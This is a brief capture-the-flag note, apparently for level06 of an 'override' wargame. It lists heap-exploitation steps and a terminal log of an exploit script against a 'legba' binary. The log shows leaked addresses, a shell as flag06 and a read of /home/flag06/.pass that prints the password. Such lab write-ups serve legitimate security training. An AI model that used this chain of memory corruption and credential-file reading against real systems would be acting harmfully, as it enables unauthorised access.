exploit : [set][free][allo][overrite][display]
```sh
level06@override:~$ echo "" > exploit.py && vim  exploit.py  && python3 exploit.py 
[+] Starting local process './legba': pid 47487
b'\x1b[0m[LEGBA] veve @ 0x62344ca322c9'
b'[LEGBA] gate @ 0x62344ca35040'
0x62344ca322c9 0x62344ca35040
b'[LEGBA] claimed 0x62344ca35040\n'
[*] Switching to interactive mode
$ ls
a.out  exploit.py  legba  legba.c  main.c
$ whoami
flag06
$ cat /home/flag06/.pass
apon9g3l7g3cp9jaspawqd135ofcfu80
```